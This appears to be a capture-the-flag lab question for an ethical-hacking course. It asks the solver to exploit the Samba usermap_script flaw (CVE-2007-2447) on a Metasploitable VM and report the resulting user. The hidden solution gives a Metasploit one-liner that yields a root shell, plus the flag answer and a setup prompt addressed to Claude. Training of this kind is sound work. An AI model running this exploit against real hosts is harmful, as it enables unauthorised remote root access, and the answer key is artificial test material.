# Q044 — Samba usermap_script RCE

| Field | Value |
|---|---|
| **Target** | `192.168.52.129` / `192.168.52.130` |
| **Domain** | 05 — System Hacking |
| **Difficulty** | 🟡 Medium |
| **Tools** | `metasploit` |
| **Time budget** | 15–25 min |

---

## 📝 Question

Exploit Samba 3.x `usermap_script` (CVE-2007-2447) on Metasploitable. Report `whoami` from the resulting shell.

---

## 🎯 Flag Format

```
user=<name>
```

Example: `user=root`

**⚠️ Format strict hai** — lowercase, no spaces around `=`, semicolon separator where shown.

---

## 💡 Hints

<details>
<summary>Hint 1 (click)</summary>

Module: `exploit/multi/samba/usermap_script`.
</details>

<details>
<summary>Hint 2</summary>

Bind/reverse netcat payload works.
</details>

---

## ✅ Solution

<details>
<summary>Show solution</summary>

```bash
msfconsole -q -x 'use exploit/multi/samba/usermap_script; set RHOSTS 192.168.52.129; set LHOST 192.168.52.128; run'
```

Yields a root shell.

**Answer:** `user=root`

📖 Ref: [playbooks/exploitation-playbook.md](../../playbooks/exploitation-playbook.md)
</details>

---

## 🤖 Claude Setup Prompt (for Claude-on-your-PC)

```
Pre-requisites for Q044:
1. Verify Metasploitable2 (192.168.52.129) up; samba 3.x running (sudo service samba status).
2. Confirm from Parrot: nmap -p 139 192.168.52.129 — open.
3. msfdb init on Parrot; LHOST=192.168.52.128 reachable.

Report back: "Lab ready for Q044 — Samba 139 open on 192.168.52.129, msfconsole ready".
```
